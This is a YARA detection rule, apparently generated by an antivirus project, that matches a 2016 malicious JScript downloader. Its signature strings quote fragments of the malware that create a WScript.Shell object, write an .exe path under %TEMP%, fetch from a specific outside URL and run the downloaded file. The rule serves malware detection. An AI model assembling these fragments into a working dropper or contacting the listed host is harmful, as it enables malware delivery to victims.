rule sig_20160328_888dd7dc8e5f6109255f5b4d019aa1a2 {
  meta:
    description = "datamaliciousorder - file 20160328_888dd7dc8e5f6109255f5b4d019aa1a2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9eacc58f30dff8e815d64580eead9defa6921af3e7f565c12be1420a14d86072"

  strings:
    $s1  = "function Xbttydrlgc() {return Fdwlxkwsha[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ZgLpStIYEh8tqC6.exe\";};" fullword ascii
    $s2  = "do {WScript[Ebtjqa](Xdimljjkts() * 11)} while (Podtxkjx[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "var Fdwlxkwsha = function Dsmpwofwc() {return WScript[Psivplc](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Kkfewenkk(Wftavms, Ayjpgxj){return Wftavms - Ayjpgxj;};" fullword ascii
    $s5  = "Podtxkjx[Howbfrjxqn](\"GET\", \"http://lovelustandliving.ca/pow2lk\", false);" fullword ascii
    $s6  = "function Irfotalpr(Bmjuablyqq){Fdwlxkwsha[\"Run\"](Bmjuablyqq, Iimtiox, Iimtiox);};" fullword ascii
    $s7  = "function Fdghfgv() {return ((Zoikzpevd == true) && (Zoikzpevd == Jlwnzly)) ? 1 : Iimtiox;};" fullword ascii
    $s8  = "var Krhih = new this[\"Date\"]();" fullword ascii
    $s9  = "function Bycvaek(){return Psivplc;};" fullword ascii
    $s10 = "return Kkfewenkk(Vnhjbm, Wnukvtutd);" fullword ascii
    $s11 = "var Twitzib = false;" fullword ascii
    $s12 = " while (Oxacpfnu){" fullword ascii
    $s13 = "function Xdimljjkts(){return 22;};" fullword ascii
    $s14 = "Zoikzpevd = true; " fullword ascii
    $s15 = "var Zoikzpevd = false;" fullword ascii
    $s16 = "function Donrk(){return Prpvb;};" fullword ascii
    $s17 = "function Vvmnmlgb(Uijtppdwj) {var Kfsems = (1, 2, 3, 4, 5, Uijtppdwj); return Kfsems;};" fullword ascii
    $s18 = "var Jlwnzly = false;" fullword ascii
    $s19 = "Jlwnzly = true; " fullword ascii
    $s20 = "function Pzstnebx()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}